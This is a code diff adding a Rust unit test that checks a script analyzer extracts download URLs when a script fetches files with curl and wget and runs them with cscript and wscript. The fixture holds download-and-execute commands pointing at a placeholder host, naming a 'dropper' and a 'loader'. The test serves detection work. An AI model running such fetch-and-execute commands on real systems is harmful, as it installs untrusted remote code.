@@ -10013,6 +10013,30 @@ mod cscript_tests {
             );
         }
     }
+
+    #[test]
+    fn script_hosts_resolve_prior_download_source_url() {
+        let script = br#"
+curl -o dropper.vbs https://script-host-source.example/dropper.vbs
+cscript //nologo dropper.vbs
+wget -O loader.js https://script-host-source.example/loader.js
+wscript loader.js
+"#;
+        let report = crate::analyze(script, &Config::default());
+        for expected in [
+            "https://script-host-source.example/dropper.vbs",
+            "https://script-host-source.example/loader.js",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing script-host source UrlArgument for {expected}: {:?}",
+                report.traits
+            );
+        }
+    }
 }
 
 #[cfg(test)]
